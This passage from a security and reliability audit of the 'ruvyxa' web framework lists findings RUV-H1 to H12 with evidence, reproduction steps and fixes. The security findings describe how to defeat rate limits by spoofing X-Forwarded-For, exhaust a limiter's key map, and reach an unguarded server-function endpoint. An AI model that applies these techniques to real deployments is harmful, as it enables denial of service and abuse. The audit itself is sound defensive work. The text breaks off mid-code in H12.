  **without** one does not, and that `download` does not rescue `javascript:`/`vbscript:`.

---

### RUV-H1 — Only the first `X-Forwarded-For` header line is read, so a proxy that appends its own hands the client its rate-limit identity

- **Severity:** High · **Category:** Security · **Subsystem:** `ruvyxa_middleware` (`GMDT-01`)
- **Affected files:** `crates/ruvyxa_middleware/src/client_ip.rs:154-163`;
  `crates/ruvyxa_middleware/src/builtin.rs:496`;
  `crates/ruvyxa_dev_server/src/action_security.rs:526-531`, `:541-546`
- **Confidence:** CONFIRMED
- **Evidence:** `headers.get("x-forwarded-for")` returns **only the first value** stored under a
  name. RFC 7230 §3.2.2 says repeated field lines are semantically the comma-joined list, so the
  correct read is `get_all`. The module correctly scans right-to-left _within_ the value, but
  duplicate field lines are a second, independent axis — and reading only the first inverts the
  ordering guarantee, because the attacker's line is the first one. The JS half is accidentally
  correct: the Fetch API's `Headers.get()` joins every instance with `", "`.
- **Reproduction path:** Behind a proxy that _adds_ a field line rather than extending the existing
  one — HAProxy's `option forwardfor` does this by default — send `X-Forwarded-For: 1.2.3.4`. The
  origin receives two lines; `get` returns the client's. Confirm with a `HeaderMap` built by
  `append` twice rather than `insert`. The Rust test helper uses `insert`, which replaces, so no
  existing test can reach the path — and the shared fixture is a JSON object, so a duplicated field
  name is not representable in it either.
- **Root cause:** The header is treated as a single value.
- **Impact:** Every per-client control keys on this answer: the built-in `rate` middleware, the
  server-action rate limiter, and the action replay guard's per-client quota. A single client
  rotating the header collects a fresh bucket per request in all three — the exact bug the file was
  written to prevent, reachable by a different route. `x-forwarded-proto` has the same first-value
  read at `action_security.rs:541`, where a forged `https` misreports the request scheme.
- **Recommended fix:** Replace `headers.get` with `headers.get_all("x-forwarded-for")`, iterate the
  values in reverse (last field line first, then right-to-left within each), falling back to
  `get_all("x-real-ip")` only when the first list is empty. Mirror for `forwarded_scheme`.
- **Regression risk:** Low — for the single-header case the iteration order is unchanged, so every
  existing fixture case still passes.
- **Required tests:** A Rust unit test building the `HeaderMap` with `append`. Because the shared
  JSON fixture cannot represent duplicates, extend `tests/fixtures/client-ip-conformance.json` with
  an optional `headerLines: [[name, value], …]` form and teach both replays to read it — otherwise
  the two hosts stay ungated on this axis.

---

### RUV-H2 — The standalone server believes `X-Forwarded-For` with nothing in front of it, while the Axum host requires a trusted transport peer

- **Severity:** High · **Category:** Security · **Subsystem:** `@ruvyxa/core` (`CORE-01`)
- **Affected files:** `packages/@ruvyxa/core/src/standalone-server.ts:122`, `:962`, `:1458`;
  `packages/ruvyxa/runtime/serverless-handler.mjs:1939`;
  `crates/ruvyxa_middleware/src/client_ip.rs:171`
- **Confidence:** CONFIRMED
- **Evidence:** The native host gates the forwarded chain on the peer —
  `if is_trusted_proxy_ip(trusted, peer) { forwarded_client_ip(...) } else { peer }`. The deployed
  host has no peer parameter and reads the header unconditionally. `standalone-server.ts` supplies
  neither a peer nor a way to derive one: Node rebuilds `Headers` from every inbound header
  (`:962`), and Bun/Deno hand the runtime's own `Request` straight through (`:1458`). The intent is
  stated at `client_ip.rs:26-30` — "the standalone server … binds `0.0.0.0` with nothing in front of
  it by default … and weighs `X-Forwarded-For` exactly the way this module does." It does not: this
  module is peer-gated and the standalone server has no peer to gate on.
- **Reproduction path:** Build an app with `middleware.builtin.rate`, deploy with
  `@ruvyxa/adapter-node`, run the emitted server with no proxy in front, send 100 requests each with
  a distinct `X-Forwarded-For`. All 100 are admitted. Under `ruvyxa start` they land in one bucket
  and are limited after five.
- **Root cause:** `clientAddress()` deliberately starts _after_ the trust decision about the
  upstream hop, and each host is supposed to make that decision for itself. A serverless function
  genuinely has no peer, which is why adapters declare `clientIpHeaders`. The standalone server is
  the third case: it _is_ a socket server and all three transports have the peer available
  (`req.socket.remoteAddress`, `server.requestIP(request)`, `Deno.serve`'s `info.remoteAddr`), but
  the file never reads it, so no trust decision is made at all.
- **Impact:** Every self-hosted deployment reachable without a header-overwriting proxy — the
  README's Docker/PM2/systemd case, and any container whose port is published directly. One client
  rotating the header defeats all three per-client controls at once and poisons the `client` field
  in the request log, so the abuse is invisible afterwards. `stack.rs` already refuses to let a
  project _configure_ this (`rate.key: "header:cf-connecting-ip"` is rejected at startup); the
  default path does quietly what the configured path is rejected for.
- **Recommended fix:** Make the trust decision in the transport, where the peer exists. Parse
  `runtimePolicy.security?.trustedProxyIps` once in `sharedServerSource`; in each transport, when
  the peer is neither loopback nor inside a configured prefix, delete `x-forwarded-for` and
  `x-real-ip` before the request reaches `handleAdmitted`. No `createHandler` change is needed — a
  stripped header makes `clientAddress()` fall through to `'unknown'`, the "buckets more
  aggressively than the traffic warrants" direction the fixture already calls safe.
- **Regression risk:** A standalone server behind an unlisted nginx/Traefik gets per-client limiting
  by accident today; after the fix it collapses to one bucket until `trustedProxyIps` is configured.
  That is the behaviour `ruvyxa start` has always had, so it is an alignment — but it needs a
  changelog line and a note in the self-hosted adapter READMEs.
- **Required tests:** Extend `tests/packages/core/standalone-server-conformance.test.ts` with a real
  Node child on `127.0.0.1` and a configured non-loopback trusted list, asserting a request carrying
  `X-Forwarded-For` is bucketed with one that does not. A Rust twin already exists:
  `forwarded_identity_is_ignored_when_the_peer_is_not_trusted`.

---

### RUV-H3 — The Netlify and Firebase adapters declare no `clientIpHeaders`, collapsing every per-client control to one bucket

- **Severity:** High · **Category:** Security · **Subsystem:** Deploy adapters (`ADP-01`)
- **Affected files:** `packages/@ruvyxa/adapter-netlify/src/index.ts:133-171`;
  `packages/@ruvyxa/adapter-firebase/src/index.ts:231-264`;
  `packages/ruvyxa/runtime/serverless-handler.mjs:1929-1955`
- **Confidence:** CONFIRMED (the divergence and the code path; the per-platform magnitude is stated
  separately)
- **Evidence:** Vercel declares `clientIpHeaders: ['x-vercel-forwarded-for']` at both entry points;
  Cloudflare declares `['cf-connecting-ip']`. Netlify's and Firebase's `createHandler` option lists
  end at `supportedStrategies`. A repo-wide grep finds `clientIpHeaders` in exactly those three
  places; no test, lint, or fixture asserts a serverless adapter declares one. With the option
  absent, `parseIngressHeaders(undefined)` returns `[]` and identity falls through to a
  right-to-left scan of `x-forwarded-for`.
- **Reproduction path:** Deploy an app with server actions via `--adapter firebase`, add
  `middleware.builtin.rate`, request from two client IPs — both land in one bucket. Read one header
  on a live deployment to settle the magnitude: if the **last** `X-Forwarded-For` entry is a fixed
  platform address, every request in the deployment shares one identity.
- **Root cause:** `clientIpHeaders` was added to the two adapters whose platform headers were being
  _removed_ from the unconditional list, and never to the two other serverless adapters, which have
  documented ingress headers of their own. Nothing asks an adapter to answer the question.
- **Impact:** Per-client rate limiting stops being per-client, in both directions: one abusive
  client drains the shared 600/60s action bucket and every other visitor gets `429`, while no
  individual caller is ever counted. Netlify and Firebase are the two serverless targets that
  support the full strategy set, so they are the most likely to be used with the `rate` middleware.
- **Recommended fix:** Add `clientIpHeaders: ['x-nf-client-connection-ip']` to the Netlify
  `createHandler` call. For Cloud Functions v2 the client is the **left** end of `X-Forwarded-For` —
  the one end this scan will not take — so the correct Firebase fix is to extend the
  `security.trustedProxyIps` guidance so the Google front-end range is skipped, not a header guess.
  Then add `clientIpHeaders` to `tests/fixtures/adapter-contract.json` as a required key per
  adapter, the way `onDemandImages` is required "so a new adapter has to decide".
- **Regression risk:** Declaring a header the platform does _not_ overwrite reintroduces exactly the
  bug the mechanism exists to prevent — one client rotating a fabricated value for a fresh bucket
  per request. The Netlify value must be verified against a live deployment, not inferred.
- **Required tests:** A per-adapter case in `tests/fixtures/adapter-contract.json`, plus an
  assertion in each adapter test that the emitted handler declares the expected ingress headers,
  plus a `serverless-handler.test.mjs` case for a request whose `X-Forwarded-For` ends in a platform
  address.

---

### RUV-H4 — The rate limiter refuses every new client once its key map is full, and the key is attacker-chosen and unbounded

- **Severity:** High · **Category:** Security · **Subsystem:** `ruvyxa_middleware` (`GMDT-03`)
- **Affected files:** `crates/ruvyxa_middleware/src/builtin.rs:22`, `:469-478`, `:499-541`;
  `crates/ruvyxa_middleware/src/stack.rs:194-208`
- **Confidence:** CONFIRMED
- **Evidence:**

  ```rust
  // builtin.rs:512-520
  if !state.contains_key(key) && state.len() >= MAX_TRACKED_RATE_LIMIT_KEYS {
      state.retain(|_, bucket| now.duration_since(bucket.last_refill) < self.window);
      if state.len() >= MAX_TRACKED_RATE_LIMIT_KEYS { return false; }
  }
  ```

  The sweep removes only buckets whose whole window has elapsed, so within one window the map cannot
  shrink, and `return false` then answers **every key not already tracked** with 429. The key is
  taken verbatim from a caller-supplied header with no length bound and no normalisation
  (`extract_key`, `:469`), and `stack.rs` accepts any valid header name for `key:`.

- **Reproduction path:** Configure `rate = { max: 100, window: 60, key: "header:x-api-key" }`, run
  `ruvyxa start`, send 10,000 requests with `X-Api-Key: 1 … 10000` (≈167 rps for a minute). Every
  subsequent request from any other untracked client gets `429` until the window rolls.
- **Root cause:** "Fail closed" applied at a **global** capacity boundary rather than a per-client
  one, so per-client key cardinality — which the attacker controls — converts directly into a
  service-wide outage. The crate's own docs describe the action limiter's alternative — "a fixed
  8192-slot array; hash collisions merge two clients, which can only refuse more" — which is exactly
  the property this limiter lacks.
- **Impact:** One client on one connection denies service to every new visitor for the rest of the
  window. With `key: "ip"` the same is reachable from a botnet, or from a single client via RUV-H1.
  Secondary: each key is an owned `String` bounded only by the header size limit, so 10,000 tracked
  keys can retain tens of megabytes — the crate's "None grows with the number of distinct clients
  seen" claim is true of the _count_ and not of the _size_.
- **Recommended fix:** Bound the key (hash with `blake3`, already a workspace dependency, or
  truncate to a fixed length) and **evict rather than refuse** at capacity — either move to the
  fixed-slot hashed array the action limiter already uses, or evict the oldest `last_refill` and
  admit the new client. Refusing is only correct when the limiter genuinely cannot answer; here it
  can.
- **Regression risk:** Hashing means a 429 can no longer name the client in a log; nothing reads the
  key back out today. A fixed-slot array makes two clients occasionally share a bucket, which the
  crate docs already accept for the action limiter and which is the safe direction.
- **Required tests:** Beside `evicts_expired_buckets_only_when_capacity_is_reached`: fill the map
  with `MAX_TRACKED_RATE_LIMIT_KEYS` _unexpired_ buckets and assert a brand-new key is still
  admitted. Plus a test that `extract_key` returns a bounded-length key for a 16 KB header value.

---

### RUV-H5 — `POST /__ruvyxa/rsc` runs server functions with no origin check, no rate limit, and no replay guard

- **Severity:** High (raised from the subsystem's Medium: this is the second mutation endpoint and
  it carries none of the four guards the first one has) · **Category:** Security
- **Subsystem:** Dev/production server request path (`DEVR-03`)
- **Affected files:** `crates/ruvyxa_dev_server/src/framework_endpoints.rs:538-593`, `:713-794`,
  `:1040-1135`; `crates/ruvyxa_dev_server/src/lib.rs:1309-1321`, `:1446-1449`;
  `crates/ruvyxa_middleware/src/stack.rs:126`; `packages/ruvyxa/runtime/serverless-handler.mjs:1701`
- **Confidence:** CONFIRMED
- **Evidence:** `/__ruvyxa/action` runs four guards — `validate_action_request` (origin +
  fetch-metadata + content-type), the action rate limiter, a stale-reference check, and a replay
  nonce. `/__ruvyxa/rsc` runs one:

  ```rust
  // framework_endpoints.rs:543-555 — the whole gate
  if headers.get(RSC_REQUEST_HEADER).and_then(|v| v.to_str().ok()) != Some("1") {
      return Err(... StatusCode::BAD_REQUEST ...)
  }
  ```

  Its docstring justifies that with "a cross-origin page cannot set a custom header without a
  preflight, and nothing here answers one" — but the project's CORS layer wraps the whole router
  (`lib.rs:1446`) and answers the preflight before the router is consulted, echoing the caller's
  `Origin` and, with `credentials: true`, `Access-Control-Allow-Credentials`.

- **Reproduction path:** Unconditional half: `POST /__ruvyxa/rsc?path=/` with `x-ruvyxa-rsc: 1` and
  any `x-ruvyxa-action` value invokes the server-components action pipeline with no rate limiter of
  any kind on a production `ruvyxa start` host — `/__ruvyxa/action` refuses the 601st call in a
  minute; this path has no ceiling. Config-dependent half: a project that sets
  `middleware.builtin.cors` to `{ origins: ['*'], headers: ['*'], credentials: true }` turns the
  header requirement into a preflight that _is_ answered, and a third-party page can then call any
  server function with the visitor's cookies.
- **Root cause:** The endpoint inherited its whole request-validation story from one header, and the
  endpoint contract pins that header as the entire cross-origin defence for both hosts.
  `same_origin_actions` and `fetch_metadata_actions` are `ServerConfig` fields with `true` defaults
  that this endpoint never reads.
- **Impact:** An unauthenticated attacker drives project server functions at line rate on a
  production host, exhausting the worker pool and starving page renders; and a project that enables
  CORS for its own API silently loses the only CSRF defence its server functions have. Both hosts
  share the second half — `serverless-handler.mjs:1701` wraps CORS around dispatch the same way.
- **Recommended fix:** In `resolve_server_components_route`, after the header check, add the same
  origin/fetch-metadata pair the action endpoint uses (threading `ConnectInfo<SocketAddr>` into both
  RSC handlers), and give `rsc_action_endpoint` an `ActionRateLimiter` key shaped like
  `action_rate_limit_key`. Then add `requiredOrigin`/`rateLimited` fields to
  `tests/fixtures/framework-endpoint-conformance.json` so the deployed host is held to the same
  thing.
- **Regression risk:** The origin check inherits fail-closed behaviour when both `Origin` and
  `Sec-Fetch-Site` are absent, which would break non-browser callers; the RSC client runtime always
  runs in a browser, but `framework-endpoints.test.mjs`'s probes send no `Origin` and need updating.
  The rate limit must not be keyed so tightly that a page issuing several server-function calls per
  interaction trips it.
- **Required tests:** A native test asserting `resolve_server_components_route` refuses
  `Origin: https://evil.test` against `Host: app.test`, and a rate-limit test mirroring
  `rate_limits_action_keys` for the RSC POST path.

---

### RUV-H6 — Generated project-root platform config is written once and then frozen, so the security-header fix never reaches an existing project

- **Severity:** High · **Category:** Security · **Subsystem:** Deploy adapters (`ADP-02`)
- **Affected files:** `packages/@ruvyxa/adapter-netlify/src/index.ts:416-426`;
  `packages/@ruvyxa/adapter-firebase/src/index.ts:187-197`;
  `packages/@ruvyxa/adapter-aws/src/index.ts:117-126`;
  `packages/@ruvyxa/adapter-railway/src/index.ts:85-95`;
  `packages/@ruvyxa/adapter-render/src/index.ts:90-100`;
  `packages/ruvyxa/runtime/adapter-runner.mjs:580-590`; `crates/ruvyxa_cli/src/config.rs:329-330`
- **Confidence:** CONFIRMED
- **Evidence:** Each adapter emits its project-root config with `skipIfExists: true`; the runner
  honours it and records `{ skipped: true }`; the Rust side deserializes that into
  `AdapterArtifactReport::skipped` and **never reads it** —
  `grep -rn "\.skipped" crates/ruvyxa_cli/src/*.rs` returns nothing. The only consumer of the
  artifact list reports a _count_. Git history shows the freeze has already outlived one real fix:

  | change                                                       | commit     | release |
  | ------------------------------------------------------------ | ---------- | ------- |
  | `skipIfExists` on `netlify.toml`                             | `f6b5efc9` | v1.0.17 |
  | `DEFAULT_SECURITY_HEADERS` into the generated `netlify.toml` | `caea7453` | v1.1.1  |

  And the frozen file is the only place the platform reads headers from, by the adapter's own
  account: "Netlify publishes pre-rendered documents and public files itself: the function — where
  `createHandler` sets these headers — is never invoked for them."

- **Reproduction path:** Check out v1.0.19, `ruvyxa build --adapter netlify`, commit the generated
  `netlify.toml` (which the adapter's doc comment says you must, because Netlify reads it before
  running the build command), upgrade to v1.1.3, rebuild. The file is unchanged, the build prints no
  warning, and the deployment serves every pre-rendered page without any of the seven security
  headers.
- **Root cause:** Two correct decisions composing into a wrong one — "never overwrite a
  user-authored platform config" and "put the framework's own security policy into that same file"
  together make the policy a snapshot taken at first build, while its source of truth keeps moving.
  The one signal that a skip happened is dropped between the runner and the terminal.
- **Impact:** Every project that first deployed before v1.1.1 on Netlify or Firebase and kept its
  generated config — the documented, expected workflow — still serves pre-rendered pages with no
  `X-Frame-Options`, no `X-Content-Type-Options`, no COOP/CORP, and no `Referrer-Policy`, while
  `ruvyxa start` on the same code serves all seven. Clickjacking and MIME sniffing on every SSG
  page. Invisible to CI, because `examples/deploy-smoke` never has a pre-existing platform config.
- **Recommended fix:** (1) **Surface the skip** — read `AdapterArtifactReport::skipped` in
  `build.rs` and warn, naming each skipped project-scope file and whether its contents still match
  what would have been written. (2) **Stop putting policy in a frozen file where an alternative
  exists** — for Netlify, `.netlify/v1/config.json` is regenerated every build and already carries
  `headerRules` verbatim, but is gated off by default because two _functions_ would collide; the
  config half collides with nothing, so emit it unconditionally and gate only the function artifact.
  Cloudflare is the proof the pattern works: its headers live in a build-scope `_headers` rewritten
  every build, so its `wrangler.jsonc` freeze costs nothing.
- **Regression risk:** Part 1 is additive output. Part 2 changes which Netlify mechanism supplies
  headers; the precedence between `netlify.toml` `[[headers]]` and `.netlify/v1/config.json` must be
  confirmed against Netlify's documentation first — if the generated config wins, a project that
  deliberately relaxed `X-Frame-Options` would silently get it back.
- **Required tests:** A case per adapter asserting the _live_ header mechanism is a build-scope or
  always-written artifact; an `adapter-runner.test.mjs` case asserting the report carries
  `skipped: true`; a Rust test asserting the warning is emitted; and a CI deploy-lane variant that
  writes a stub `netlify.toml` before the build and asserts the build warns.

---

### RUV-H7 — The magic-link confirmation page cannot submit its own form: `no-referrer` makes browsers send `Origin: null`

- **Severity:** High · **Category:** Reliability (security-adjacent) · **Subsystem:** `@ruvyxa/auth`
  (`SEC-01`)
- **Affected files:** `packages/@ruvyxa/auth/src/index.ts:664`, `:357-365`, `:105-108`, `:604-609`
- **Confidence:** CONFIRMED
- **Evidence:** `htmlPage` hard-codes `<meta name="referrer" content="no-referrer">`; the page's
  only control is a POST form back to this server; and that POST is gated on an exact `Origin` match
  (`assertSameOrigin`, strict equality against `settings.origin`).
- **Reproduction path:** Configure a `magic-link` provider, request a link, open the emailed URL in
  Chrome or Firefox, click **Continue**. The request arrives with `Origin: null` and the server
  answers `403 RUV3101`.
- **Root cause:** WHATWG Fetch, _Append a request `Origin` header_, step 3.1: for a request whose
  mode is not `cors` and whose method is neither `GET` nor `HEAD` — exactly a form-POST navigation —
  the serialized origin is replaced by the literal `null` when the referrer policy is `no-referrer`.
  Two correct decisions (strip the token from the Referer; require `Origin` on state-changing POSTs)
  made independently and colliding.
- **Impact:** Passwordless sign-in is non-functional for every real browser user. The token is never
  consumed, so it also stays live in the store until its 900 s TTL expires. Programmatic clients
  that set `Origin` themselves — and the test suite — are unaffected, which is why this shipped.
- **Recommended fix:** Either (a) replace `no-referrer` with
  `<meta name="referrer" content="same-origin">`, which keeps the token out of cross-origin Referers
  while leaving `Origin` intact per the same Fetch step; or (b) keep `no-referrer` and accept
  `Origin: null` on `/magic-link/callback` **only** when the POST also carries
  `Sec-Fetch-Site: same-origin`, or a per-page CSRF token minted into the form. (a) is the one-line
  change. Do not simply delete `assertSameOrigin` here.
- **Regression risk:** (a) reintroduces the token into same-origin `Referer` headers — where it
  already is, in the URL bar — and keeps it out of cross-origin ones. (b) widens what the endpoint
  accepts and must be scoped to this path only.
- **Required tests:** Extend the "consumes magic links exactly once" case with a POST carrying
  `origin: 'null'` and assert 303, not 403. More durably, a check that no `htmlPage` rendering a
  form also emits `no-referrer`, or a Playwright lane that clicks the button.

---

### RUV-H8 — A minified ESM import is silently erased, because normalisation reaches the rewriter but not the two passes that read the same lines

- **Severity:** High · **Category:** Reliability · **Subsystem:** Bundler back-end (`BUNB-02`)
- **Affected files:** `crates/ruvyxa_bundler/src/linker.rs:1635-1647`, `:1685-1690`, `:2140-2153`,
  `:906-925`, `:1579-1585`
- **Confidence:** CONFIRMED
- **Evidence:** `rewrite_module_into` normalises each statement before deciding anything
  (`normalize_esm_statement`, `:912-917`). `collect_external_imports` walks the same lines of the
  same `module.js` and does not — it tests `trimmed.starts_with("import ")`, which
  `import{x}from"pkg"` fails. So does `declares_esm_syntax`, which decides the `__esModule` marker.
  `normalize_esm_statement` exists precisely because those spellings are what a published `dist`
  contains.
- **Reproduction path:** A `.mjs` under `node_modules` whose first line is
  `import{jsx}from"react/jsx-runtime"` and second is `export{jsx}`, imported from an SSR route where
  the specifier is external. The hoister skips the line; the rewriter then normalises it, fails to
  resolve it, and — because `drop_external_imports` is `true` for every module segment — replaces it
  with an empty line. Nothing is hoisted, no `RUV1611` stub is emitted, and the binding is gone. The
  bundle parses, so neither `verify_linked_syntax` nor `reject_surviving_esm` says anything.
- **Root cause:** Three passes read the same module lines and ask the same two questions, and only
  one of them sees the normalised text. The guard meant to catch a mishandled ESM statement is blind
  here by construction: the statement did not survive, it was deleted.
- **Impact:** Silent wrong output with no build-time signal — the exact failure class
  RUV1610/1611/1612 were built to prevent. A server route throws
  `ReferenceError: <binding> is not defined` on first render; a browser route on first use, with a
  stack pointing at a content-hashed chunk and nothing naming the package. The `__esModule` variant
  is worse: nothing throws, and the default import silently holds `{ default: … }` instead of the
  value.
- **Recommended fix:** Normalise once, before every reader. Add
  `fn normalized_statement(line: &str) -> Cow<'_, str>` and use it at all three call sites —
  `collect_external_imports` (the `starts_with` tests, the `split_from_specifier` call, and the
  `strip_prefix("import ")`), and `declares_esm_syntax` — so a fourth reader cannot be added without
  it.
- **Regression risk:** Low. Normalisation only inserts spaces at token boundaries it has already
  proven are token boundaries, and returns `None` for the already-spaced common case, so no existing
  bundle's bytes change. The one visible change is that previously-skipped statements now get
  hoisted or stubbed — which is the fix.
- **Required tests:** Beside `server_link_hoists_external_imports` and
  `client_link_replaces_unresolvable_bare_imports_with_throwing_bindings`, add the minified
  spellings `import{React}from"react"` and `import*as R from"react"` asserting the same
  hoist/`RUV1611` outcomes, plus an `__esModule` case for a module whose only export line is
  `export{a as default}`.

---

### RUV-H9 — A multi-line `import Default, { … } from` clause is not re-printed, so the linker fails the build on Prettier-formatted JavaScript

- **Severity:** High · **Category:** Reliability · **Subsystem:** Bundler front-end / back-end
  (`BUNB-01`; the fix lands in `compiler.rs`)
- **Affected files:** `crates/ruvyxa_bundler/src/compiler.rs:312-333`, `:430-443`;
  `crates/ruvyxa_bundler/src/linker.rs:1563-1599`, `:995-1069`
- **Confidence:** CONFIRMED
- **Evidence:** The re-print trigger tests for the clause brace _immediately_ after the keyword:

  ```rust
  // compiler.rs:329 — `rest` for `import React, {` is " React, {"
  rest.trim_start().starts_with('{') && !rest.contains('}')
  ```

  which is false. `has_esm_statement_sharing_a_line` is also false (the keyword is first on its
  line), so `expand_multi_statement_esm` returns `None` and the module reaches the line-based linker
  verbatim. `split_from_specifier` then finds no `" from "` on the line and `reject_surviving_esm`
  fails the build with RUV1612. The existing gate tests exactly two positive shapes, both with the
  brace immediately after the keyword.

- **Reproduction path:** A `.js` or `.mjs` file in a project or in `node_modules` containing
  `import React, {\n  useState,\n} from "react";`. The build fails with
  `RUV1612 … still contains a top-level 'import' after linking`. The same file renamed `.ts` builds,
  because oxc re-prints it.
- **Root cause:** The trigger asks "is the brace first?" instead of "does this line open a brace it
  does not close?" The default-plus-named form, the namespace-plus-named form, and a line break
  before `from` all open a construct the linker cannot span, and none puts `{` first.
  `import Default, {` is precisely what Prettier produces for a React import that outgrows the print
  width, so it is the most common of the three.
- **Impact:** A build-blocking failure on legal, conventionally formatted JavaScript, with a
  diagnostic that blames the wrong thing — the hint says either "its specifier did not resolve" or
  "may have failed to parse for re-printing", and neither is true. A plain-JavaScript project hits
  it on its own source; a TypeScript project through an unbundled `.mjs` dependency.
- **Recommended fix:** In `compiler.rs:312-332`, replace the brace-first test with "the line opens a
  brace it does not close" — over `masked_code`, count `{` minus `}` on the statement line and
  return true when positive. Keep the two deliberate exceptions the doc comment names
  (`export default {`, `export const x = {`) by requiring no `=` on the line and, for `export`, not
  starting `export default`/`export const|let|var`. Separately extend `reject_surviving_esm`'s hint
  with a third case naming an unclosed clause brace.

  **Correction (2026-08-29, from implementing this).** The exception rule proposed above is
  **insufficient and would have caused a large regression**: `export function f() {` and
  `export class C {` satisfy all of "no `=`, not `export default`, not `export const|let|var`" and
  open an unclosed brace, so the literal guard would have re-printed essentially every `.js` module
  in the graph. What shipped instead is a positive grammar rule — the text between the keyword and
  the first `{` must be empty, `Default,`, or `* as ns,` — which subsumes the two documented
  exceptions and excludes the declaration forms. Five negative test cases pin it.

  **Residual, not fixed.** This finding lists three broken shapes. The two clause-carrying ones are
  fixed and tested. The third — a line break before `from` with **no** clause brace, e.g.
  `import Default from\n  "./m.js"` — is still invisible to both predicates, and the fix proposed
  above would not have reached it either. It remains open.

- **Regression risk:** Widening the trigger sends more `.js` modules through oxc codegen, changing
  their emitted bytes (formatting, and comment classes other than legal/annotation are dropped) — a
  cache-key change and a one-time rebuild, not a correctness change. `expand_multi_statement_esm`
  already returns `None` on a parse failure, so an unparseable dependency still passes through
  untouched. The exclusion list must hold.
- **Required tests:** Add the default-plus-named and line-break-before-`from` shapes to
  `only_a_multiline_clause_asks_for_a_re_print`, and a bundle-level test putting the
  default-plus-named form in a `node_modules` `.js` file, asserting the bundle links and parses.

---

### RUV-H10 — A regex-blind second tokenizer, in both languages, makes an `.mdx` file with a quote-bearing regex compile to a module that does not parse

- **Severity:** High · **Category:** Reliability · **Subsystem:** runtime compiler + bundler content
  (`RTMC-01`, reported independently in Rust as `BUNF-03`)
- **Affected files:** `packages/ruvyxa/runtime/compiler.mjs:3789`, `:3747`, `:3619`;
  `crates/ruvyxa_bundler/src/content.rs:387`, `:333`, `:325`, `:320`
- **Confidence:** CONFIRMED — reproduced through the shipped `compileContentSource`
- **Evidence:** Both tokenizers handle line comments, block comments, and the three quote
  characters, and neither has a regular-expression branch. `scanner.mjs`'s own header names the
  consequence: "a literal such as `/['"]/` starts a string skip that runs to the next quote anywhere
  in the file, and everything in between silently stops being seen as code." The Rust copy at
  `content.rs:387` is character-for-character the same walk.
- **Reproduction path:** An `.mdx` file whose export block is `export const pattern = /['"]/`
  followed by `export const frontmatter = { title: 'Hi' }`. Result: `"export const frontmatter"`
  appears **twice** and the module throws
  `SyntaxError: Identifier 'frontmatter' has already been declared`. The control without the regex
  line emits it once and parses. The reverse direction is also reachable — a desync that makes an
  unrelated `export const frontmatter` visible makes `contentExport` return `''`, so the
  frontmatter/headings exports are **silently missing** instead.
- **Root cause:** A private lexer that knows three of the four non-code constructs, in a repository
  whose stated rule is one scanner per language. The correct primitive already exists and is public
  on both sides: `maskNonCode` / `ast::masked_code` blank strings, templates, comments **and**
  regexes in place, preserving byte offsets. `content.rs` additionally uses
  `character.is_alphanumeric()` for identifiers, which is false for the combining marks Thai,
  Devanagari, Arabic, Hebrew and Vietnamese are written with.
- **Impact:** Any author who writes a regex containing a quote in an `.mdx` file — a validation
  snippet, a parsing example, a docs page about regular expressions — gets a hard build failure
  whose message names a declaration they never wrote. Because both halves are the same walk, there
  is no host where the file works.
- **Recommended fix:** Delete both tokenizers. In `compiler.mjs`, derive `hasNamedExport` from
  `maskNonCode(source, { preserveImportExportSpecifiers: true })` plus the existing `findInCode` /
  `exportListBinds` walk. In `content.rs`, reimplement `has_named_export` on `ast::parse_module` +
  `ast::has_named_runtime_export`, adding a clause helper for the `export { … as NAME }` form beside
  `named_clause_exports_default` rather than reviving a local tokenizer.
- **Regression risk:** `has_named_export` currently matches `export` inside template _text_
  (templates are opaque to it); routing through the mask makes it stricter — the intended direction,
  but it changes the answer for MDX output that embeds an `export` in a template literal.
  `ast::has_named_runtime_export` also ignores re-export forms, so cover
  `export { x as frontmatter } from './y'` before switching.
- **Required tests:** `.mdx` cases in a content fixture (there is no `content-conformance.json`
  today) covering a regex containing `'`, `"`, and a backtick, each above a user-written
  `export const frontmatter`, asserting the compiled module both parses and exports the user's
  value. Belongs beside `module-syntax.test.mjs`, which already **executes** its output. Add a
  combining-mark identifier case on the Rust side.

---

### RUV-H11 — The linker indents every physical line of a module body, including lines inside a multi-line template literal

- **Severity:** High · **Category:** Reliability — silent data corruption · **Subsystem:** runtime
  compiler + bundler linker (`RTMC-02`)
- **Affected files:** `packages/ruvyxa/runtime/compiler.mjs:1687`;
  `crates/ruvyxa_bundler/src/linker.rs:1382-1390`
- **Confidence:** CONFIRMED — reproduced through the real linker
- **Evidence:** `rewritten.code` is split on physical newlines and every non-empty line gets two
  spaces, with nothing asking whether the line is inside a literal. Observed:

  ```
  css   expected "a {\n  color: red;\n}"
  css   got      "a {\n    color: red;\n  }"
  ```

- **Reproduction path:** Any module exporting a multi-line template literal, compiled through
  `compileBundleWithMetadata` and imported. Reproduced above.
- **Root cause:** The linker is line-based by deliberate trade, but the _emit_ step is not
  literal-aware even though `maskNonCode` — used by the rewriters one function earlier — knows
  exactly which lines are template text.
- **Impact:** Every module wrapped in the IIFE gains two spaces on each continuation line of every
  multi-line template literal and each continuation line of a `\`-continued string. Harmless for
  whitespace-insensitive payloads (CSS-in-JS, GraphQL); wrong for anything indentation-significant:
  YAML, Python, a shell script, a `<pre>` block, a Markdown fence, a snapshot string, an email body.
  Because the Rust linker corrupts identically, SSR and the client bundle agree with each other and
  disagree with what plain ESM would produce — so nothing surfaces as a hydration mismatch and the
  only symptom is a string that is quietly not what the author wrote.
- **Recommended fix:** In `linkModules`, compute `maskNonCode(rewritten.code)` once and indent line
  _n_ only when the mask's line _n_ begins in code. The mask preserves offsets and newlines, so
  `masked.split('\n')[index]` lines up one-to-one. `linker.rs:1382` needs the equivalent, keyed off
  `ModuleAst.text_spans`, which it already carries for this class of question.
- **Regression risk:** The emitted bytes of every existing bundle change for modules containing
  multi-line templates, so any golden-output or reproducible-build assertion over those bundles
  moves once. Nothing observable to an application changes except that the string becomes correct.
- **Required tests:** `tests/fixtures/module-syntax-conformance.json` already has "template literal
  spanning lines with an export inside" but asserts only a line **count**, which this defect
  preserves. Change it to assert `JSON.stringify(hit)`, and add a `\`-continued string case.

---

### RUV-H12 — A warm dependency-cache hit returns an empty alias map, breaking aliased imports in every route after the first — and persists the empty map

- **Severity:** High · **Category:** Reliability · **Subsystem:** Bundler front-end (`BUNF-01`)
- **Affected files:** `crates/ruvyxa_bundler/src/resolver.rs:1925`, `:1792`, `:1844`, `:144`;
  `crates/ruvyxa_bundler/src/incremental.rs:238`, `:255`
- **Confidence:** CONFIRMED
- **Evidence:**

  ```rust
  // resolver.rs:1925 — the in-memory cache stores only paths
  if let Some(dependencies) = cache.dependencies.get(&key) {
